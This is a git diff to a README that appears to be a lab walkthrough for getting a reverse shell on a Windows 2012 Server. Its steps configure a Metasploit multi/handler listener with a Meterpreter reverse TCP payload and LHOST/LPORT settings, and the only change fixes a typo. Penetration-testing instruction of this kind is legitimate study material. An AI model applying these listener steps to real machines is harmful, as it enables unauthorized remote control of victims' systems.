@@ -11,7 +11,7 @@ This is a demonstration of obtaining a reverse shell on a Windows 2012 Server. T
   - 2 - use multi/handler <br>
   - 3 - configure payload (preferable : windows/meterpreter/rerverse_tcp) <br>
   - 4 - ensure that the "LHOST" and "LPORT" settings are correctly configured. You may do so, by running : set LHOST <IP Address of Host> and the set LPORT <port you would like to listen on> <br>
-  - 5 - once this has been completed, you may run : run -j or exploit -j at the msf prompt. This will create a persistent listener that will exit once you tell it to, it a disconnect from the client(victim). After doing so, you should see the following screen : <br>
+  - 5 - once this has been completed, you may run : run -j or exploit -j at the msf prompt. This will create a persistent listener that will exit once you tell it to, if a disconnect from the client(victim). After doing so, you should see the following screen : <br>
   
   ![image](https://user-images.githubusercontent.com/101802030/225851486-2fa0062f-5b31-435c-8b7d-9b492d37a588.png)
   
